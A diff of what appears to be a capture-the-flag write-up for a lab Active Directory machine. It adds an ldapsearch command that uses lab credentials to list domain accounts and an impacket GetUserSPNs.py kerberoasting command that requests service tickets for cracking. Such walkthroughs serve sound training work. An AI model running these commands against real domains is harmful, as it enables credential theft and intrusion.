@@ -63,13 +63,13 @@
 
 9. Hash doesn't crack, so we try kerberoasting with a different method. First, enumerate all usernames with ldapsearch
 
-``
+`ldapsearch -x -H ldap://rustykey.htb -D 'rr.parker@rustykey.htb' -w '8#t5HE8L!W3A' -b "DC=rustykey,DC=htb" "(objectCategory=*)" sAMAccountName | grep '^sAMAccountName:' | cut -d' ' -f2 > accountList`
 
 ![image](https://github.com/user-attachments/assets/2f6787e2-1765-4f50-b0d9-c30819116bb2)
 
 10. Then try kerberoasting using impacket's GetUserSPNs.py script using the `-usersfile` flag
 
-``
+`GetUserSPNs.py -usersfile accountList -request -k -dc-ip 10.129.244.92 -dc-host dc.rustykey.htb rustykey.htb/rr.parker:"8#t5HE8L\!W3A" -outputfile kerberoast.txt`
 
 ![image](https://github.com/user-attachments/assets/dd7e5e13-5d06-4055-b210-bd046e3d64da)
 
